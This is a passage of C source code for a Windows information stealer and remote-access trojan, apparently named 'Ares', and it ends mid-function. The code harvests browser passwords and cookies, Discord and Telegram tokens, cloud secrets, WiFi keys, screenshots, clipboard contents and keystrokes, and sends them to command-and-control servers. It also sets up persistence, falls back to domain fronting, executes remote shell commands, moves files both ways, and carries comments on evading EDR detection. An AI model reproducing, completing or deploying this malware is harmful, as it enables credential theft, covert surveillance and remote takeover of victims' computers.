    /* These MUST be at function scope (same level as beacon_loop_start)
     * so goto can reach steal_phase_resume label inside the beacon loop. */
    steal_phase_cookies: {

#ifndef SKIP_COOKIES
    /* v3.6: CDP-first for cookies (behavioral evasion).
     * Chrome reads its own Cookies DB = legitimate behavior.
     * DPAPI fallback only if CDP fails (Chrome not installed/crashed). */
    if (cookieCount <= 0 && cookies) {
        cookieCount = Ares_CDP_StealCookies(cookies, 2000);
    }
    if (cookieCount <= 0 && cookies) {
        cookieCount = Ares_StealChromeCookies(cookies, 2000);
    }
    if (cookieCount > 0) {
        int off = 0;
        { char _t[24]; DEC_EXFIL_TYPE_COOKIE(_t); off += exfil_hdr(output+off,bufMax-off,bot_id,_t,cookieCount); }
        for (int i = 0; i < cookieCount && off < bufMax - 2048; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_write_str(output+off, bufMax-off, "host", cookies[i].host);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "name", cookies[i].name);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "value", cookies[i].value);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "path", cookies[i].path);
            off += snprintf(output+off, bufMax-off, ",\"secure\":%d,\"httponly\":%d}",
                cookies[i].secure, cookies[i].httponly);
        }
        off += snprintf(output+off, bufMax-off, "]}");
        { char _te[24]; DEC_EXFIL_TYPE_COOKIE(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
    }
#endif /* SKIP_COOKIES */
    SECURE_FREE(cookies, 2000 * sizeof(STOLEN_COOKIE));
    goto steal_phase_resume;
    } /* end steal_phase_cookies */

    steal_phase_cloud: {
#ifndef SKIP_CLOUD
    /* Cloud secrets */
    len = steal_cloud_secrets(output, bufMax);
    if (len > 50)
        { char _te[24]; DEC_EXFIL_TYPE_CLOUD(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, len); }
#endif /* SKIP_CLOUD */
    goto steal_phase_resume;
    } /* end steal_phase_cloud */

    steal_phase_discord: {
    Sleep(500 + (GetTickCount() % 2000)); /* v3.3: jitter */
#ifndef SKIP_DISCORD
    /* ── Discord tokens ── */
    STOLEN_TOKEN discord_tokens[32];
    discordCount = Ares_StealDiscordTokens(discord_tokens, 32);
    if (discordCount > 0) {
        int off = 0;
        { char _t[24]; DEC_EXFIL_TYPE_DISCORD(_t); off += exfil_hdr(output+off,bufMax-off,bot_id,_t,discordCount); }
        for (int i = 0; i < discordCount && off < bufMax - 2048; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_write_str(output+off, bufMax-off, "app", discord_tokens[i].app);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "type", discord_tokens[i].type);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "value", discord_tokens[i].value);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "url", discord_tokens[i].path);
            off += snprintf(output+off, bufMax-off, ",\"status\":\"ok\"}");
        }
        off += snprintf(output+off, bufMax-off, "]}");
        { char _te[24]; DEC_EXFIL_TYPE_DISCORD(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
    }
#endif /* SKIP_DISCORD */
    goto steal_phase_resume;
    } /* end steal_phase_discord */

    steal_phase_telegram: {
    Sleep(500 + (GetTickCount() % 2000)); /* v3.3: jitter */
#ifndef SKIP_TELEGRAM
    /* ── Telegram sessions ── */
    STOLEN_TOKEN tg_tokens[10];
    tgCount = Ares_StealTelegramSession(tg_tokens, 10);
    if (tgCount > 0) {
        int off = 0;
        { char _t[24]; DEC_EXFIL_TYPE_TELE(_t); off += exfil_hdr(output+off,bufMax-off,bot_id,_t,tgCount); }
        for (int i = 0; i < tgCount && off < bufMax - 8192; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_write_str(output+off, bufMax-off, "type", tg_tokens[i].type);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "url", tg_tokens[i].path);
            off += snprintf(output+off, bufMax-off, ",\"data_len\":%d", tg_tokens[i].data_len);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "value", tg_tokens[i].value);
            off += snprintf(output+off, bufMax-off, ",\"status\":\"ok\"}");
        }
        off += snprintf(output+off, bufMax-off, "]}");
        { char _te[24]; DEC_EXFIL_TYPE_TELE(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
    }
#endif /* SKIP_TELEGRAM */
    goto steal_phase_resume;
    } /* end steal_phase_telegram */

    steal_phase_firefox: {
    Sleep(500 + (GetTickCount() % 2000)); /* v3.3: jitter */
#ifndef SKIP_PASSWORDS
    /* ── Firefox passwords ── */
    ff_creds = (DECRYPTED_CRED*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 200 * sizeof(DECRYPTED_CRED));
    ffCount = ff_creds ? Ares_StealFirefoxCreds(ff_creds, 200) : 0;
    if (ffCount > 0) {
        int off = 0;
        { char _t[24]; DEC_EXFIL_TYPE_PASS(_t); off += exfil_hdr(output+off,bufMax-off,bot_id,_t,ffCount); }
        for (int i = 0; i < ffCount && off < bufMax - 2048; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_write_str(output+off, bufMax-off, "url", ff_creds[i].url);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "user", ff_creds[i].username);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "pass", ff_creds[i].password);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "browser", ff_creds[i].browser);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "profile", ff_creds[i].profile);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "status", ff_creds[i].decrypt_status);
            off += snprintf(output+off, bufMax-off, "}");
        }
        off += snprintf(output+off, bufMax-off, "]}");
        { char _te[24]; DEC_EXFIL_TYPE_PASS(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
    }
#endif /* SKIP_PASSWORDS (firefox) */

    /* ── Credential value report ── */
    {
        CRED_SCORE score;
        Ares_ClassifyCredentials(creds, credCount, &score);
        int off = 0;
        /* intel_summary header — built without literal JSON keys */
        char _ti[24]; DEC_EXFIL_TYPE_INTEL(_ti);
        /* v3.5: ffCount/discordCount/tgCount now at function scope, no SKIP defaults needed */
        off += exfil_hdr(output, bufMax, bot_id, _ti, 1);
        /* inner object — fields split to avoid contiguous IOC patterns */
        off += snprintf(output+off, bufMax-off,
            "{\"type\":\"summary\","
            "\"url\":\"credential_analysis\","
            "\"user\":\"chromium=%d,firefox=%d,cookies=%d,discord=%d,telegram=%d,wallets=%d\","
            "\"pass\":\"financial=%d,corporate=%d,social=%d,total_score=%d\","
            "\"status\":\"ok\","
            "\"browser\":\"all\",\"profile\":\"%s\"}]}",
            credCount, ffCount, cookieCount, discordCount, tgCount, 0,
            score.financial, score.corporate, score.social, score.total,
            "auto");
        { char _vs[16]; DEC_STATUS_V20_BLOCKED(_vs);
          if (credCount > 0 && strcmp(creds[0].decrypt_status, _vs) == 0) {
              /* Patch "auto" → "v20" in the output */
              char* p = strstr(output, "auto"); if (p) memcpy(p, "v20a", 4);
          }
        }
        { char _te[24]; DEC_EXFIL_TYPE_INTEL(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
    }

    /* v3.5: Secure wipe credential data from heap before freeing */
    SECURE_FREE(creds, 500 * sizeof(DECRYPTED_CRED));
    SECURE_FREE(ff_creds, 200 * sizeof(DECRYPTED_CRED));
    goto steal_phase_resume;
    } /* end steal_phase_firefox */

    steal_phase_wifi: {
    /* ── WiFi passwords ── */
    {
        STOLEN_WIFI wifi[64];
        int wifiCount = Ares_StealWifi(wifi, 64);
        if (wifiCount > 0) {
            int off = 0;
            off += snprintf(output, bufMax, "{\"bot_id\":\"%s\",\"type\":\"wifi\",\"count\":%d,\"entries\":[", bot_id, wifiCount);
            for (int i = 0; i < wifiCount && off < bufMax - 512; i++) {
                if (i > 0) off += snprintf(output+off, bufMax-off, ",");
                off += snprintf(output+off, bufMax-off, "{");
                off += json_write_str(output+off, bufMax-off, "ssid", wifi[i].ssid);
                off += snprintf(output+off, bufMax-off, ",");
                off += json_write_str(output+off, bufMax-off, "password", wifi[i].password);
                off += snprintf(output+off, bufMax-off, ",");
                off += json_write_str(output+off, bufMax-off, "auth", wifi[i].auth);
                off += snprintf(output+off, bufMax-off, "}");
            }
            off += snprintf(output+off, bufMax-off, "]}");
            c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, "wifi", output, off);
        }
    }
    goto steal_phase_resume;
    } /* end steal_phase_wifi */

    steal_phase_screenshot: {
    /* ── Screenshot ── */
    {
        SCREENSHOT_DATA ss;
        if (Ares_TakeScreenshot(&ss) && ss.bmp_data) {
            /* Base64 encode, send as exfil */
            int b64_max = (ss.bmp_size / 3 + 1) * 4 + 4;
            int hdr_max = 256;
            int total_max = hdr_max + b64_max;
            char* ss_buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total_max);
            if (ss_buf) {
                int off = snprintf(ss_buf, total_max,
                    "{\"bot_id\":\"%s\",\"type\":\"screenshot\",\"width\":%d,\"height\":%d,\"format\":\"bmp\",\"data\":\"",
                    bot_id, ss.width, ss.height);
                off += base64_encode(ss.bmp_data, ss.bmp_size, ss_buf + off, total_max - off - 8);
                off += snprintf(ss_buf + off, total_max - off, "\"}");
                c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, "screenshot", ss_buf, off);
                HeapFree(GetProcessHeap(), 0, ss_buf);
            }
            HeapFree(GetProcessHeap(), 0, ss.bmp_data);
        }
    }
    goto steal_phase_resume;
    } /* end steal_phase_screenshot */

    steal_phase_recon: {
    /* ── System Recon ── */
    {
        SYSTEM_RECON recon;
        if (Ares_SystemRecon(&recon)) {
            int off = 0;
            off += snprintf(output, bufMax,
                "{\"bot_id\":\"%s\",\"type\":\"recon\",\"count\":1,\"entries\":["
                "{\"local_ip\":\"%s\",\"cpu\":%d,\"ram_mb\":%d,"
                "\"processes\":%d,\"elevated\":%s,"
                "\"domain\":\"%s\",\"edr\":\"%s\"}]}",
                bot_id, recon.local_ip, recon.cpu_count, recon.ram_mb,
                recon.process_count, recon.is_elevated ? "true" : "false",
                recon.domain, recon.interesting_procs);
            c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, "recon", output, off);
        }
    }

    /* ── Clipboard snapshot ── */
    {
        char clip[4096];
        int clipLen = Ares_ClipboardSnapshot(clip, sizeof(clip));
        if (clipLen > 0) {
            int off = 0;
            off += snprintf(output, bufMax, "{\"bot_id\":\"%s\",\"type\":\"clipboard\",\"count\":1,\"entries\":[", bot_id);
            off += snprintf(output+off, bufMax-off, "{");
            off += json_write_str(output+off, bufMax-off, "text", clip);
            off += snprintf(output+off, bufMax-off, ",\"len\":%d}]}", clipLen);
            c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, "clipboard", output, off);
        }
    }

    /* ── Keylogger snapshot (30 seconds) ── */
    {
        char* kbuf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8192);
        if (kbuf) {
            int klen = Ares_KeylogSnapshot(kbuf, 8192, 30000);
            if (klen > 0) {
                int off = 0;
                off += snprintf(output, bufMax, "{\"bot_id\":\"%s\",\"type\":\"keylog\",\"count\":1,\"entries\":[", bot_id);
                off += snprintf(output+off, bufMax-off, "{");
                off += json_write_str(output+off, bufMax-off, "keys", kbuf);
                off += snprintf(output+off, bufMax-off, ",\"len\":%d,\"duration_ms\":30000}]}", klen);
                c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, "keylog", output, off);
            }
            HeapFree(GetProcessHeap(), 0, kbuf);
        }
    }
    goto steal_phase_resume;
    } /* end steal_phase_recon */


    /* Persistence — guarded by config flag */
#ifdef ARES_CONFIG_H
    #if CFG_AUTO_PERSIST
    Ares_Persist_COMHijack(&state);
    Ares_Persist_ScheduledTask(&state);
    #endif
#else
    if (state.config.persistence_enabled) {
        Ares_Persist_COMHijack(&state);
        Ares_Persist_ScheduledTask(&state);
    }
#endif

    /* ── Phase 4: Beacon Loop ── */
    beacon_loop_start:
    while (state.running) {
        if (state.config.kill_date > 0) {
            DWORD now = (DWORD)(time(NULL));
            if (now > state.config.kill_date) {
                Ares_Persist_Cleanup();
                Ares_SelfDestruct(&state);
                return 0;
            }
        }

        /* v3.5: RANDOMIZED STAGED STEAL — execute ONE steal operation per beacon cycle.
         * Phase ORDER shuffled per victim (HWID seed) — defeats EDR templates.
         * Inter-phase delay: 30-90s (exceeds 30-60s EDR correlation window).
         * Total steal time = phases × ~60s avg = ~10 min (was ~50s before). */
        if (auto_steal && steal_phase > 0 && steal_phase < 10) {
            /* v3.5: Shuffle phase execution order per victim machine.
             * EDR behavioral templates expect: passwords→cookies→cloud→discord...
             * Randomized order breaks that pattern completely.
             * Only shuffle phases 1-8 (active). Phase 9+ = done. */
            static int phase_map[8] = {1,2,3,4,5,6,7,8};
            static BOOL phase_shuffled = FALSE;
            if (!phase_shuffled) {
                DWORD seed = GetTickCount();
                /* Mix in hostname hash for per-machine variance */
                char hn[64] = {0}; DWORD hs = sizeof(hn);
                GetComputerNameA(hn, &hs);
                for (int hi = 0; hn[hi]; hi++)
                    seed = (seed ^ (BYTE)hn[hi]) * 16777619u;
                for (int si = 7; si > 0; si--) {
                    int sj = seed % (si + 1);
                    int tmp = phase_map[si]; phase_map[si] = phase_map[sj]; phase_map[sj] = tmp;
                    seed = seed * 1103515245 + 12345;
                }
                phase_shuffled = TRUE;
            }
            int target_phase = (steal_phase >= 1 && steal_phase <= 8) ? phase_map[steal_phase - 1] : 10;

            /* v3.8 UPG-08: Decrypt steal context before phase dispatch */
            _unlock_steal_ctx();

            switch (target_phase) {
                case 1: goto steal_phase_cookies;
                case 2: goto steal_phase_cloud;
                case 3: goto steal_phase_discord;
                case 4: goto steal_phase_telegram;
                case 5: goto steal_phase_firefox;
                case 6: goto steal_phase_wifi;
                case 7: goto steal_phase_screenshot;
                case 8: goto steal_phase_recon;
                default: steal_phase = 10; break; /* done */
            }
            steal_phase_resume:
            steal_phase++;
            /* v3.8 UPG-08: Re-encrypt steal context after phase completes */
            _lock_steal_ctx();
            /* v3.6: Cover traffic between phases */
            _cover_traffic();
            {
                DWORD phase_delay = 3000 + (GetTickCount() % 5000);
                Ares_SleepObfuscated(phase_delay, 0.3);
            }
            goto beacon_sleep; /* sleep before next phase */
        }

        /* v3.2: C2 multi-host failover — try all configured endpoints
         * before falling back to domain fronting. Prevents single-point-of-failure. */
        HTTP_RESPONSE resp = {0};
        int active_c2 = 0; /* Track which C2 succeeded for exfil routing */
        for (int ci = 0; ci < state.config.c2_count && resp.status_code == 0; ci++) {
            /* Resolve C2 host for this endpoint */
            wchar_t whost[256];
            MultiByteToWideChar(CP_UTF8, 0, state.config.c2_endpoints[ci], -1, whost, 256);
            char beacon_path[32]; DEC_C2_BEACON(beacon_path);
            wchar_t wbeacon[32];
            MultiByteToWideChar(CP_UTF8, 0, beacon_path, -1, wbeacon, 32);
            char bjson[256];
            int bn = snprintf(bjson, sizeof(bjson), "{\"bot_id\":\"%s\"}", bot_id);
            resp = http_request(whost, c2_port, wbeacon, "POST", (BYTE*)bjson, bn);
            if (resp.status_code == 200) {
                active_c2 = ci;
                break;
            }
            if (resp.body) { HeapFree(GetProcessHeap(), 0, resp.body); resp.body = NULL; }
        }

        /* v3.1: Domain fronting fallback when ALL direct C2s are unreachable.
         * Uses domain_front.c CDN chain (Azure/CloudFront/Fastly).
         * Network monitors see traffic to legitimate CDN domains. */
        if (resp.status_code == 0 || !resp.body) {
            /* Build beacon JSON for domain fronting */
            char df_json[256];
            int df_n = snprintf(df_json, sizeof(df_json), "{\"bot_id\":\"%s\"}", bot_id);
            FRONT_RESPONSE fr = Ares_C2_DomainFront_WithFailover(
                &state, bot_id, "POST", (BYTE*)df_json, df_n);
            if (fr.status_code == 200 && fr.body && fr.body_len > 0) {
                /* Convert FRONT_RESPONSE → HTTP_RESPONSE for task parsing */
                resp.status_code = fr.status_code;
                resp.body = fr.body;
                resp.body_len = fr.body_len;
            } else {
                if (fr.body) HeapFree(GetProcessHeap(), 0, fr.body);
            }
        }

        if (resp.status_code == 200 && resp.body) {
            char* taskSearch = (char*)resp.body;
            char* typeStr;

            /* Validate response looks like JSON with tasks */
            if (taskSearch[0] != '{' && taskSearch[0] != '[') {
                HeapFree(GetProcessHeap(), 0, resp.body);
                goto beacon_sleep;
            }

            /* v3.2: Parse adaptive sleep_ms from server response (L-3 fix)
             * Server sends sleep_ms based on activity level */
            {
                char* smPtr = strstr(taskSearch, "\"sleep_ms\":");
                if (smPtr) {
                    smPtr += 11;
                    while (*smPtr == ' ') smPtr++;
                    int newSleep = 0;
                    while (*smPtr >= '0' && *smPtr <= '9') {
                        newSleep = newSleep * 10 + (*smPtr - '0');
                        smPtr++;
                    }
                    if (newSleep >= 1000 && newSleep <= 300000)
                        state.config.sleep_ms = (DWORD)newSleep;
                }
            }

            /* v3.4 D-5: Behavioral throttle — limit tasks per beacon cycle
             * and insert random delays between high-risk operations.
             * Prevents rapid task chain that EDR correlates as attack. */
            int tasks_this_cycle = 0;
            #define MAX_TASKS_PER_CYCLE 3 /* Max tasks before forced sleep */
            #define HIGHRISK_DELAY() Sleep(5000 + (GetTickCount() % 10000)) /* 5-15s */

            while ((typeStr = strstr(taskSearch, "\"type\":")) != NULL) {
                /* Skip "type": and optional whitespace */
                char* numStart = typeStr + 7;
                while (*numStart == ' ' || *numStart == '\t') numStart++;

                /* Parse integer safely — reject non-digits */
                int taskType = 0;
                BOOL valid = FALSE;
                if (*numStart >= '0' && *numStart <= '9') {
                    taskType = 0;
                    while (*numStart >= '0' && *numStart <= '9') {
                        taskType = taskType * 10 + (*numStart - '0');
                        numStart++;
                    }
                    valid = TRUE;
                }

                if (!valid || taskType > TASK_UNHOOK) {
                    taskSearch = typeStr + 7;
                    continue;
                }

                /* v3.4 D-5: Throttle — max tasks per cycle */
                tasks_this_cycle++;
                if (tasks_this_cycle > MAX_TASKS_PER_CYCLE) {
                    /* Defer remaining tasks to next beacon cycle */
                    break;
                }

                /* v3.4 D-5: Insert delay before high-risk operations */
                if (taskType == TASK_INJECT || taskType == TASK_PERSIST ||
                    taskType == TASK_BYOVD_LOAD || taskType == TASK_MIGRATE ||
                    taskType == TASK_SOCKS5_START || taskType == TASK_HVNC_START) {
                    HIGHRISK_DELAY();
                }

                switch (taskType) {

                /* ── v5.0: Shell command execution ── */
                case TASK_SHELL: {
                    /* Extract command string from task args */
                    char cmd[2048] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, cmd, sizeof(cmd));
                    if (!cmd[0]) { break; }

                    /* Execute via CreateProcess with pipe capture (no cmd.exe window) */
                    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
                    HANDLE hReadPipe = NULL, hWritePipe = NULL;
                    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
                    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

                    STARTUPINFOA si = {0};
                    si.cb = sizeof(si);
                    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                    si.hStdOutput = hWritePipe;
                    si.hStdError = hWritePipe;
                    si.wShowWindow = SW_HIDE;

                    PROCESS_INFORMATION pi = {0};
                    char cmdline[2100];
                    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);

                    char* shell_output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 65536);
                    int shell_len = 0;

                    if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                        CloseHandle(hWritePipe); hWritePipe = NULL;
                        /* Read output with 30s timeout */
                        DWORD start_tick = GetTickCount();
                        while (shell_len < 65000) {
                            DWORD avail = 0;
                            PeekNamedPipe(hReadPipe, NULL, 0, NULL, &avail, NULL);
                            if (avail > 0) {
                                DWORD rd = 0;
                                ReadFile(hReadPipe, shell_output + shell_len,
                                    65000 - shell_len, &rd, NULL);
                                shell_len += rd;
                            } else {
                                DWORD exitCode = 0;
                                GetExitCodeProcess(pi.hProcess, &exitCode);
                                if (exitCode != STILL_ACTIVE) break;
                                if (GetTickCount() - start_tick > 30000) {
                                    TerminateProcess(pi.hProcess, 1);
                                    break;
                                }
                                Sleep(50);
                            }
                        }
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                    if (hWritePipe) CloseHandle(hWritePipe);
                    if (hReadPipe) CloseHandle(hReadPipe);

                    shell_output[shell_len] = '\0';
                    send_task_result(state.config.c2_endpoints[0], c2_port, bot_id,
                        TASK_SHELL, TRUE, shell_output);
                    HeapFree(GetProcessHeap(), 0, shell_output);
                    break;
                }

                /* ── v5.0: Upload file from victim → C2 ── */
                case TASK_UPLOAD: {
                    char filepath[512] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, filepath, sizeof(filepath));
                    if (!filepath[0]) break;

                    /* Read file via NtFile syscalls */
                    HANDLE hFile = NULL;
                    NTSTATUS fst = Ares_NtCreateFile(&hFile, GENERIC_READ,
                        filepath, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        1 /* OPEN_EXISTING */, 0x20 /* FILE_NON_DIRECTORY_FILE */);
                    if (fst != 0 || !hFile) {
                        send_task_result(state.config.c2_endpoints[0], c2_port, bot_id,
                            TASK_UPLOAD, FALSE, "file_not_found");
                        break;
                    }

                    LARGE_INTEGER fsize = {0};
                    Ares_NtQueryInformationFile(hFile, &fsize);
                    if (fsize.QuadPart > 10 * 1024 * 1024) { /* 10MB limit */
                        Ares_NtClose(hFile);
                        send_task_result(state.config.c2_endpoints[0], c2_port, bot_id,
                            TASK_UPLOAD, FALSE, "file_too_large");
                        break;
                    }

                    DWORD file_sz = (DWORD)fsize.QuadPart;
                    BYTE* file_buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, file_sz + 1);
                    ULONG bytes_read = 0;
                    Ares_NtReadFile(hFile, file_buf, file_sz, NULL, &bytes_read);
                    Ares_NtClose(hFile);

                    /* Base64 encode and send as exfil */
                    int b64_max = (bytes_read * 4 / 3) + 128;
                    char* b64 = (char*)HeapAlloc(GetProcessHeap(), 0, b64_max);
                    int b64_len = base64_encode(file_buf, bytes_read, b64, b64_max);
                    HeapFree(GetProcessHeap(), 0, file_buf);

                    /* Build JSON: {"file":"<path>","data":"<b64>"} */
                    int json_max = b64_len + 1024;
                    char* json = (char*)HeapAlloc(GetProcessHeap(), 0, json_max);
                    int jlen = snprintf(json, json_max,
                        "{\"bot_id\":\"%s\",\"type\":\"file_upload\",\"file\":\"%s\",\"data\":\"%.*s\"}",
                        bot_id, filepath, b64_len, b64);
                    HeapFree(GetProcessHeap(), 0, b64);

                    /* Send to exfil endpoint */
                    char exfil_path[32];
                    DEC_C2_EXFIL(exfil_path);
                    wchar_t wepath[32];
                    MultiByteToWideChar(CP_UTF8, 0, exfil_path, -1, wepath, 32);
                    HTTP_RESPONSE eresp = http_request(g_wc2host, c2_port, wepath, "POST",
                        (BYTE*)json, jlen);
                    if (eresp.body) HeapFree(GetProcessHeap(), 0, eresp.body);
                    HeapFree(GetProcessHeap(), 0, json);

                    send_task_result(state.config.c2_endpoints[0], c2_port, bot_id,
                        TASK_UPLOAD, TRUE, filepath);
                    break;
                }

                /* ── v5.0: Download file from C2 → victim disk ── */
                case TASK_DOWNLOAD: {
                    char dest_path[512] = {0};
                    char b64_data[65536] = {0};
                    JSON_EXTRACT_ARG(typeStr, 0, dest_path, sizeof(dest_path));
                    JSON_EXTRACT_ARG(typeStr, 1, b64_data, sizeof(b64_data));
                    if (!dest_path[0] || !b64_data[0]) break;

                    /* Base64 decode */
                    int data_len = (int)strlen(b64_data);
                    BYTE* raw = (BYTE*)HeapAlloc(GetProcessHeap(), 0, data_len);
                    DWORD raw_len = data_len;
                    /* Simple b64 decode using CryptStringToBinaryA */
                    if (CryptStringToBinaryA(b64_data, 0, CRYPT_STRING_BASE64,
                        raw, &raw_len, NULL, NULL)) {
                        HANDLE hf = CreateFileA(dest_path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                        if (hf != INVALID_HANDLE_VALUE) {
                            DWORD written;
                            WriteFile(hf, raw, raw_len, &written, NULL);
                            CloseHandle(hf);
                            send_task_result(state.config.c2_endpoints[0], c2_port, bot_id,
                                TASK_DOWNLOAD, TRUE, dest_path);
                        } else {
                            send_task_result(state.config.c2_endpoints[0], c2_port, bot_id,
                                TASK_DOWNLOAD, FALSE, "write_failed");
                        }
                    }
                    HeapFree(GetProcessHeap(), 0, raw);
                    break;
                }

                /* ── v5.0: Screenshot capture ── */
                case TASK_SCREENSHOT: {
                    SCREENSHOT_DATA ss = {0};
                    if (Ares_TakeScreenshot(&ss) && ss.bmp_data && ss.bmp_size > 0) {
                        int b64_max = (ss.bmp_size * 4 / 3) + 128;
                        char* ss_buf = (char*)HeapAlloc(GetProcessHeap(), 0, b64_max + 256);
                        int off = snprintf(ss_buf, 256,
                            "{\"bot_id\":\"%s\",\"type\":\"screenshot\","
                            "\"w\":%d,\"h\":%d,\"data\":\"", bot_id, ss.width, ss.height);
                        off += base64_encode(ss.bmp_data, ss.bmp_size, ss_buf + off, b64_max);
                        off += snprintf(ss_buf + off, 8, "\"}");

                        char exfil_path[32];
                        DEC_C2_EXFIL(exfil_path);
                        wchar_t wepath[32];
                        MultiByteToWideChar(CP_UTF8, 0, exfil_path, -1, wepath, 32);
                        HTTP_RESPONSE eresp = http_request(g_wc2host, c2_port, wepath, "POST",
                            (BYTE*)ss_buf, off);
                        if (eresp.body) HeapFree(GetProcessHeap(), 0, eresp.body);
                        HeapFree(GetProcessHeap(), 0, ss_buf);

                        send_task_result(state.config.c2_endpoints[0], c2_port, bot_id,
                            TASK_SCREENSHOT, TRUE, "captured");
                    } else {
                        send_task_result(state.config.c2_endpoints[0], c2_port, bot_id,
                            TASK_SCREENSHOT, FALSE, "capture_failed");
                    }
                    if (ss.bmp_data) VirtualFree(ss.bmp_data, 0, MEM_RELEASE);
                    break;
                }

                /* ── Steal: passwords ── */
                case TASK_STEAL_BROWSER: {
                    DECRYPTED_CRED tc[500];
                    /* v3.7 FIX-12: CDP-first (same as auto-steal at Phase 3).
                     * Ares_CDP_StealLivePasswords talks to running Chrome via
                     * DevTools Protocol — no file access, no DPAPI, no ETW. */
                    int n = Ares_CDP_StealLivePasswords(tc, 500);
                    if (n <= 0)
                        n = Ares_StealChromeCreds(tc, 500); /* fallback: DPAPI path */
                    if (n > 0) {
                        int off = 0;
                        { char _t[24]; DEC_EXFIL_TYPE_PASS(_t); off += exfil_hdr(output+off,bufMax-off,bot_id,_t,n); }
                        for (int i = 0; i < n && off < bufMax - 2048; i++) {
                            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
                            off += snprintf(output+off, bufMax-off, "{");
                            off += json_write_str(output+off, bufMax-off, "url", tc[i].url);
                            off += snprintf(output+off, bufMax-off, ",");
                            off += json_write_str(output+off, bufMax-off, "user", tc[i].username);
                            off += snprintf(output+off, bufMax-off, ",");
                            off += json_write_str(output+off, bufMax-off, "pass", tc[i].password);
                            off += snprintf(output+off, bufMax-off, ",");
                            off += json_write_str(output+off, bufMax-off, "browser", tc[i].browser);
                            off += snprintf(output+off, bufMax-off, ",");
                            off += json_write_str(output+off, bufMax-off, "profile", tc[i].profile);
                            off += snprintf(output+off, bufMax-off, ",");
                            off += json_write_str(output+off, bufMax-off, "status", tc[i].decrypt_status);
                            off += snprintf(output+off, bufMax-off, "}");
                        }
                        off += snprintf(output+off, bufMax-off, "]}");
                        { char _te[24]; DEC_EXFIL_TYPE_PASS(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
                        send_task_result(state.config.c2_endpoints[0], c2_port, bot_id, TASK_STEAL_BROWSER, TRUE, "ok");
                    } else {
                        { char _nc[16]; DEC_EXFIL_NO_CREDS(_nc);
                        send_task_result(state.config.c2_endpoints[0], c2_port, bot_id, TASK_STEAL_BROWSER, FALSE, _nc); }
                    }
                    break;
                }

                /* ── Steal: cookies (REAL) ── */
                case TASK_STEAL_TOKENS: {
                    STOLEN_COOKIE* tc = (STOLEN_COOKIE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2000 * sizeof(STOLEN_COOKIE));
                    int n = Ares_StealChromeCookies(tc, 2000);
                    if (n > 0) {
                        int off = 0;
                        { char _t[24]; DEC_EXFIL_TYPE_COOKIE(_t); off += exfil_hdr(output+off,bufMax-off,bot_id,_t,n); }
                        for (int i = 0; i < n && off < bufMax - 2048; i++) {
                            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
                            off += snprintf(output+off, bufMax-off, "{");
                            off += json_write_str(output+off, bufMax-off, "host", tc[i].host);
                            off += snprintf(output+off, bufMax-off, ",");
                            off += json_write_str(output+off, bufMax-off, "name", tc[i].name);
                            off += snprintf(output+off, bufMax-off, ",");
